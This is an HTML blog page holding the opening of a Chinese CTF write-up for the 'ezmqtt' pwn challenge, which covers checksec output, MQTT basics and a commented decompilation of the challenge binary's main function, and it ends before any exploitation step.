@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>强网杯2025车联网赛道-ezmqtt（easymqtt） | shanza's hideout</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="keywords" content="">
+  <meta name="theme-color" content="#10b981">
+
+  <link rel="canonical" href="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/">
+
+  
+
+  <meta name="description" content="题目附件 Arch:     amd64-64-little RELRO:    Full RELRO Stack:    Canary found NX:       NX enabled PIE:      PIE enabled RUNPATH:  b&#39;$ORIGIN&#39;  题目提供了四份文件，ld-linux-x86-64.so.2 和 libc.so.6 库文件，pwn 主">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2025车联网赛道-ezmqtt（easymqtt）">
+<meta property="og:url" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/index.html">
+<meta property="og:site_name" content="shanza&#39;s hideout">
+<meta property="og:description" content="题目附件 Arch:     amd64-64-little RELRO:    Full RELRO Stack:    Canary found NX:       NX enabled PIE:      PIE enabled RUNPATH:  b&#39;$ORIGIN&#39;  题目提供了四份文件，ld-linux-x86-64.so.2 和 libc.so.6 库文件，pwn 主">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/1.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/2.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/3.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/4.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/5.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/6.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/7.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/8.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/9.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/10.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/11.png">
+<meta property="og:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/12.png">
+<meta property="article:published_time" content="2026-09-16T13:34:01.000Z">
+<meta property="article:modified_time" content="2026-09-18T13:17:09.916Z">
+<meta property="article:author" content="shanza">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/1.png">
+  <meta name="generator" content="Hexo 7.3.0">
+  <script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://shanzade.github.io/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/"},"headline":"强网杯2025车联网赛道-ezmqtt（easymqtt）","description":"题目附件 Arch:     amd64-64-little RELRO:    Full RELRO Stack:    Canary found NX:       NX enabled PIE:      PIE enabled RUNPATH:  b&#39;$ORIGIN&#39; 题目提供了四份文件，ld-","datePublished":"2026-09-16T13:34:01.000Z","dateModified":"2026-09-18T13:17:09.916Z","author":{"@type":"Person","name":"shanza"},"publisher":{"@type":"Organization","name":"shanza's hideout","logo":{"@type":"ImageObject","url":"https://shanzade.github.io/favicon.ico"}}}
+</script>
+
+  
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  <style>
+    :root {
+      --sea-color-primary: #10b981;
+      
+    }
+  </style>
+
+  
+<script src="/js/theme_mode.js"></script>
+
+<!-- hexo injector head_end start --><style id="custom-font">
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-Regular.woff2") format("woff2");
+    font-weight: 400;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-Medium.woff2") format("woff2");
+    font-weight: 500;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-SemiBold.woff2") format("woff2");
+    font-weight: 600;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Montserrat";
+    src: url("/fonts/Montserrat-Bold.woff2") format("woff2");
+    font-weight: 700;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Fira Code";
+    src: url("/fonts/FiraCode-Regular.woff2") format("woff2");
+    font-weight: 400;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Fira Code";
+    src: url("/fonts/FiraCode-Medium.woff2") format("woff2");
+    font-weight: 500;
+    font-style: normal;
+    font-display: swap;
+  }
+  @font-face {
+    font-family: "Fira Code";
+    src: url("/fonts/FiraCode-Bold.woff2") format("woff2");
+    font-weight: 700;
+    font-style: normal;
+    font-display: swap;
+  }
+
+  :root {
+    --sea-font-family: "Montserrat", sans-serif;
+    --sea-font-family-code: "Fira Code", ui-monospace, Consolas, "Courier New", monospace;
+  }
+
+  /* 正文（标题、列表、导航、页脚等都继承自 body） */
+  body {
+    font-family: var(--sea-font-family);
+  }
+
+  /* 代码：行内 code、代码块、代码块里的 token、行号 */
+  code,
+  pre,
+  pre code,
+  pre code *,
+  .line-numbers-rows {
+    font-family: var(--sea-font-family-code);
+    
+  }
+</style><!-- hexo injector head_end end --></head>
+<body>
+  <header class="sea-header">
+    <nav class="sea-nav-wrap">
+  <div class="sea-nav-logo" title="">
+    <a href="/">shanza's hideout</a>
+  </div>
+  <div class="sea-nav-menus">
+    <div id="sea-nav-toggle">
+      <svg t="1716965724278" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10878" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M950.857143 768v73.142857c0 20.004571-16.566857 36.571429-36.571429 36.571429H109.714286c-20.004571 0-36.571429-16.566857-36.571429-36.571429v-73.142857c0-20.004571 16.566857-36.571429 36.571429-36.571429h804.571428c20.004571 0 36.571429 16.566857 36.571429 36.571429z m0-292.571429v73.142858c0 20.004571-16.566857 36.571429-36.571429 36.571428H109.714286c-20.004571 0-36.571429-16.566857-36.571429-36.571428v-73.142858c0-20.004571 16.566857-36.571429 36.571429-36.571428h804.571428c20.004571 0 36.571429 16.566857 36.571429 36.571428z m0-292.571428v73.142857c0 20.004571-16.566857 36.571429-36.571429 36.571429H109.714286c-20.004571 0-36.571429-16.566857-36.571429-36.571429V182.857143c0-20.004571 16.566857-36.571429 36.571429-36.571429h804.571428c20.004571 0 36.571429 16.566857 36.571429 36.571429z" p-id="10879"></path></svg>
+    </div>
+
+    <div id="sea-nav-dimmer"></div>
+<div class="sea-menu-wrap">
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/posts/"
+    >
+      所有文章
+    </a>
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/categories/"
+    >
+      分类
+    </a>
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/tags/"
+    >
+      标签
+    </a>
+  
+    <a
+      class="sea-menu-link "
+      
+      href="/archives/"
+    >
+      归档
+    </a>
+  
+
+  <span class="sea-menu-sep">|</span>
+
+  
+
+  <span class="sea-menu-icon" id="sea-theme-dark">
+    <svg t="1725413107294" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10118" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M557.553778 976.355556c-257.265778 0-466.56-207.160889-466.56-464.426667 0-253.923556 206.577778-464.284444 460.501333-464.284445h0.355556c10.766222 0 20.622222 3.953778 25.443555 13.610667 4.878222 9.756444 3.740444 20.394667-2.915555 29.027556-55.722667 72.220444-85.162667 158.108444-85.162667 249.372444 0 225.891556 183.779556 409.386667 409.671111 409.386667l5.248-0.256c10.325333-0.142222 20.977778 5.859556 25.841778 15.644444a28.302222 28.302222 0 0 1-2.915556 30.051556C837.902222 910.08 703.203556 976.355556 557.553778 976.355556zM495.274667 105.016889C299.192889 135.281778 147.882667 306.161778 147.882667 509.809778c0 225.877333 183.779556 409.656889 409.671111 409.656889 108.686222 0 210.403556-42.055111 286.577778-116.977778-231.566222-27.192889-411.804444-224.625778-411.804445-463.36 0-83.427556 21.617778-163.299556 62.947556-234.112z" fill="" p-id="10119"></path><path d="M578.830222 879.132444c-186.865778 0-345.784889-133.418667-377.841778-317.269333a14.222222 14.222222 0 1 1 28.017778-4.878222c29.681778 170.183111 176.810667 293.703111 349.824 293.703111a14.222222 14.222222 0 1 1 0 28.444444zM209.991111 531.2c-7.537778 0-13.838222-6.997333-14.193778-14.606222-0.312889-6.584889-0.483556-13.795556-0.483555-20.465778 0-7.864889 6.357333-14.492444 14.222222-14.492444s14.222222 6.229333 14.222222 14.094222c0 6.229333 0.170667 13.425778 0.455111 19.584 0.369778 7.850667-5.674667 15.886222-13.525333 15.886222h-0.696889z" fill="" p-id="10120"></path><path d="M622.350222 309.930667m-25.344 0a25.344 25.344 0 1 0 50.688 0 25.344 25.344 0 1 0-50.688 0Z" fill="" p-id="10121"></path><path d="M787.072 188.273778m-25.344 0a25.344 25.344 0 1 0 50.688 0 25.344 25.344 0 1 0-50.688 0Z" fill="" p-id="10122"></path><path d="M731.960889 415.303111m-25.344 0a25.344 25.344 0 1 0 50.688 0 25.344 25.344 0 1 0-50.688 0Z" p-id="10123"></path></svg>
+  </span>
+  <span class="sea-menu-icon" id="sea-theme-light">
+    <svg t="1725410359322" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4274" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M512 768c-141.376 0-256-114.624-256-256s114.624-256 256-256 256 114.624 256 256-114.624 256-256 256z m0-85.333333a170.666667 170.666667 0 1 0 0-341.333334 170.666667 170.666667 0 0 0 0 341.333334zM469.333333 85.333333a42.666667 42.666667 0 1 1 85.333334 0v85.333334a42.666667 42.666667 0 1 1-85.333334 0V85.333333z m0 768a42.666667 42.666667 0 1 1 85.333334 0v85.333334a42.666667 42.666667 0 1 1-85.333334 0v-85.333334zM85.333333 554.666667a42.666667 42.666667 0 1 1 0-85.333334h85.333334a42.666667 42.666667 0 1 1 0 85.333334H85.333333z m768 0a42.666667 42.666667 0 1 1 0-85.333334h85.333334a42.666667 42.666667 0 1 1 0 85.333334h-85.333334zM161.834667 222.165333a42.666667 42.666667 0 0 1 60.330666-60.330666l64 64a42.666667 42.666667 0 0 1-60.330666 60.330666l-64-64z m576 576a42.666667 42.666667 0 0 1 60.330666-60.330666l64 64a42.666667 42.666667 0 0 1-60.330666 60.330666l-64-64z m-515.669334 64a42.666667 42.666667 0 0 1-60.330666-60.330666l64-64a42.666667 42.666667 0 0 1 60.330666 60.330666l-64 64z m576-576a42.666667 42.666667 0 0 1-60.330666-60.330666l64-64a42.666667 42.666667 0 0 1 60.330666 60.330666l-64 64z" p-id="4275"></path></svg>
+  </span>
+
+  <span id="sea-menu-close-icon">
+    <svg t="1725435896874" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4408" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M556.8 512l265.6-265.6c12.8-12.8 12.8-32 0-44.8s-32-12.8-44.8 0L512 467.2 246.4 201.6c-12.8-12.8-32-12.8-44.8 0s-12.8 32 0 44.8l265.6 265.6-265.6 265.6c-12.8 12.8-12.8 32 0 44.8 6.4 6.4 12.8 9.6 22.4 9.6s16-3.2 22.4-9.6l265.6-265.6 265.6 265.6c6.4 6.4 16 9.6 22.4 9.6s16-3.2 22.4-9.6c12.8-12.8 12.8-32 0-44.8L556.8 512z" p-id="4409"></path></svg>
+  </span>
+</div>
+  </div>
+</nav>
+  </header>
+  <main id="sea-main-wrapper" data-pagefind-body>
+    <article class="sea-page-card-wrapper">
+  <header class="sea-article-header">
+    <h1 class="sea-article-title">强网杯2025车联网赛道-ezmqtt（easymqtt）</h1>
+    
+      <div class="sea-post-meta sea-post-meta__center">
+        <div class="sea-post-time">
+  <svg t="1716964550804" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2621" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M805.49888 981.49888l-602.3168-0.76288c-86.59456-8.192-154.56768-81.3056-154.56768-170.01472L48.6144 291.73248c0-94.1568 76.60032-170.75712 170.7776-170.75712l586.10176 0c94.1568 0 170.73152 76.60032 170.73152 170.75712L976.22528 810.7008C976.2304 904.87296 899.63008 981.49888 805.49888 981.49888L805.49888 981.49888zM219.3664 190.57152c-55.79776 0-101.20192 45.38368-101.20192 101.18144l0 518.96832c0 55.79776 45.40416 101.20704 101.20192 101.20704l586.13248 0c55.77728 0 101.16096-45.40928 101.16096-101.20704L906.65984 291.73248c0-55.79776-45.38368-101.18656-101.16096-101.18656L219.3664 190.54592 219.3664 190.57152zM698.84416 290.51904c-25.60512 0-46.38208-20.77696-46.38208-46.38208l0-158.6688c0-25.6 20.77696-46.38208 46.38208-46.38208 25.6 0 46.38208 20.78208 46.38208 46.38208L745.22624 244.1216C745.22624 269.7472 724.46976 290.51904 698.84416 290.51904L698.84416 290.51904zM315.65824 290.51904c-25.60512 0-46.38208-20.77696-46.38208-46.38208l0-158.6688c0-25.6 20.77696-46.38208 46.38208-46.38208 25.6 0 46.38208 20.78208 46.38208 46.38208L362.04032 244.1216C362.04032 269.7472 341.28896 290.51904 315.65824 290.51904L315.65824 290.51904zM534.8864 794.78784l-44.27264 0c-25.6 0-46.38208-20.77696-46.38208-46.38208 0-25.6 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.78208 46.38208 46.38208C581.26848 774.01088 560.4864 794.78784 534.8864 794.78784L534.8864 794.78784zM930.79552 452.608 121.24672 452.608c-25.60512 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.77696-46.38208 46.38208-46.38208l809.5744 0c25.6 0 46.38208 20.77696 46.38208 46.38208C977.2032 431.82592 956.42624 452.608 930.79552 452.608L930.79552 452.608zM327.92576 649.03168l-44.27264 0c-25.6 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.77696 46.38208 46.38208C374.30784 628.25472 353.52576 649.03168 327.92576 649.03168L327.92576 649.03168zM534.8864 649.03168l-44.27264 0c-25.6 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.77696 46.38208 46.38208S560.4864 649.03168 534.8864 649.03168L534.8864 649.03168zM741.27872 649.03168l-44.26752 0c-25.60512 0-46.38208-20.78208-46.38208-46.38208 0-25.60512 20.77696-46.38208 46.38208-46.38208l44.26752 0c25.60512 0 46.38208 20.77696 46.38208 46.38208C787.6608 628.25472 766.90944 649.03168 741.27872 649.03168L741.27872 649.03168zM327.92576 794.78784l-44.27264 0c-25.6 0-46.38208-20.77696-46.38208-46.38208 0-25.6 20.78208-46.38208 46.38208-46.38208l44.27264 0c25.6 0 46.38208 20.78208 46.38208 46.38208C374.30784 774.01088 353.52576 794.78784 327.92576 794.78784L327.92576 794.78784zM741.27872 794.78784l-44.26752 0c-25.60512 0-46.38208-20.77696-46.38208-46.38208 0-25.6 20.77696-46.38208 46.38208-46.38208l44.26752 0c25.60512 0 46.38208 20.78208 46.38208 46.38208C787.6608 774.01088 766.90944 794.78784 741.27872 794.78784L741.27872 794.78784z" p-id="2622"></path></svg>
+  <time datetime="2026-09-16T13:34:01.000Z">2026-09-16</time>
+</div>
+        
+  <div class="sea-post-categories">
+    <svg t="1716964680422" class="sea-svg-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4550" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><path d="M810.666667 85.333333a85.333333 85.333333 0 0 1 85.333333 85.333334v152.021333c36.821333 9.493333 64 42.88 64 82.645333v405.333334a128 128 0 0 1-128 128H192a128 128 0 0 1-128-128V298.666667a85.376 85.376 0 0 1 64-82.645334V170.666667a85.333333 85.333333 0 0 1 85.333333-85.333334h597.333334zM128.149333 296.170667L128 298.666667v512a64 64 0 0 0 60.245333 63.893333L192 874.666667h640a64 64 0 0 0 63.893333-60.245334L896 810.666667V405.333333a21.333333 21.333333 0 0 0-18.837333-21.184L874.666667 384H638.165333l-122.069333-101.717333a21.333333 21.333333 0 0 0-10.688-4.736l-2.986667-0.213334H149.333333a21.333333 21.333333 0 0 0-21.184 18.837334zM535.189333 213.333333l127.978667 106.666667H832V170.666667a21.333333 21.333333 0 0 0-18.837333-21.184L810.666667 149.333333H213.333333a21.333333 21.333333 0 0 0-21.184 18.837334L192 170.666667v42.666666h343.168z" p-id="4551"></path></svg>
+    <a class="category-link" href="/categories/pwn/">pwn</a>
+  </div>
+
+        
+        
+      </div>
+    
+  </header>
+  <div class="sea-doc">
+    
+    <div class="sea-article-content">
+      <p><a target="_blank" rel="noopener" href="https://github.com/shanzade/ctf_attachments/blob/main/ezmqtt.zip">题目附件</a></p>
+<pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-little
+RELRO:    Full RELRO
+Stack:    Canary found
+NX:       NX enabled
+PIE:      PIE enabled
+RUNPATH:  b&#39;$ORIGIN&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>题目提供了四份文件，<code>ld-linux-x86-64.so.2</code> 和 <code>libc.so.6</code> 库文件，<code>pwn</code> 主程序和 <code>libpaho-mqtt3c.so.1</code> mqtt 库。<br>mqtt 库是 github 上开源的一个项目；该赛道的另一道题 <code>babymqtt</code> 放入 ida9 中会自动识别 go 导入的库。<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/1.png"></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/eclipse-paho">https://github.com/eclipse-paho</a></p>
+<p>easymqtt 这道题是 c 库，而 babymqtt 是 go 库，后者相对来说会更难一些。</p>
+<p><em>这道题是赛后才解出来的，比赛时间应该是 2025 年 11 月左右。</em><br><em>比赛的时候也没解出来，赛后了解了 mqtt 协议之后才做出来的。所以这道题算是边学边解的。</em></p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a><code>main</code> 函数</h2><p>原本想尝试在 ida 中分析 elf 的同时导入 so，但是发现好像怎么导入都无法识别。<br>只能单独分开分析了，好在 so 库还有符号。<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/2.png"></p>
+<p>mqtt 由 <strong>三种角色</strong> 组成：发布者 publisher、服务器 broker、订阅者 subscriber。<br><strong>发布者本身也可以是订阅者。</strong><br>发布者和订阅者都是客户端，服务器仅充当消息中转。</p>
+<p>mqtt 根据 <strong>主题</strong> 来向各个客户端转发消息，主题通过 <code>/</code> 区分层级，例如：</p>
+<pre class="line-numbers language-none"><code class="language-none">chat  --  接收或发送至 chat 主题下的消息
+sensor&#x2F;temperature  --  接收&#x2F;发送至 sensor 下 temperature 的消息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>因为 so 库没有删除符号，所以可以通过 <code>File</code> -&gt; <code>Produce file</code> -&gt; <code>Create C header file...</code> 来导出 so 库的头文件到另一边进行分析。（虽说导入会报错，但是仍旧能够导入库内的很多结构体，对后续分析有点用）<br><img src="/2026/09/16/%E5%BC%BA%E7%BD%91%E6%9D%AF2025%E8%BD%A6%E8%81%94%E7%BD%91%E8%B5%9B%E9%81%93-ezmqtt%EF%BC%88easymqtt%EF%BC%89/3.png"></p>
+<p>知道这些信息之后，配合 so 静态分析，就应该可以看懂 <code>main</code> 函数了。</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>brokerUrl<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>brokerUrl1<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-8h]</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+    brokerUrl <span class="token operator">=</span> <span class="token string">"tcp://localhost:9999"</span><span class="token punctuation">;</span>         <span class="token comment">// 服务器地址，默认连接到本地，也可以通过反代连接到主机（此处 pwn 运行在虚拟机）</span>
+  <span class="token keyword">else</span>
+    brokerUrl <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  brokerUrl1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>brokerUrl<span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Using server at %s\n"</span><span class="token punctuation">,</span> brokerUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  rc <span class="token operator">=</span> <span class="token function">MQTTClient_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>client<span class="token punctuation">,</span> brokerUrl1<span class="token punctuation">,</span> <span class="token string">"httpclient"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 类比创建套接字</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> rc <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed to create client, return code %d\n"</span><span class="token punctuation">,</span> rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    rc <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">else</span>
+  <span class="token punctuation">&#123;</span>
+    rc <span class="token operator">=</span> <span class="token function">MQTTClient_setCallbacks</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> connlost<span class="token punctuation">,</span> msgarrvd<span class="token punctuation">,</span> delivered<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 设置回调函数，mqtt 库会自动调用这 3 个方法，分别处理连接丢失、消息接收、消息发送三种情况</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> rc <span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed to set callbacks, return code %d\n"</span><span class="token punctuation">,</span> rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      rc <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">&#123;</span>
+      conn_opts<span class="token punctuation">.</span>keepAliveInterval <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>
+      conn_opts<span class="token punctuation">.</span>cleansession <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+      rc <span class="token operator">=</span> <span class="token function">MQTTClient_connect</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> <span class="token operator">&amp;</span>conn_opts<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// "MQTC\b"</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>rc <span class="token punctuation">)</span>                                <span class="token comment">// 发起连接</span>
+      <span class="token punctuation">&#123;</span>
+        <span class="token function">MQTTClient_subscribe</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> <span class="token string">"HTTP"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 订阅 HTTP 主题消息</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token function">msgsend</span><span class="token punctuation">(</span><span class="token string">"200"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                       <span class="token comment">// 循环间隔 1 秒发送消息</span>
+          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"waiting for message\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Failed to connect, return code %d\n"</span><span class="token punctuation">,</span> rc<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      rc <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">MQTTClient_destroy</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>client<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 退出</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> rc<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
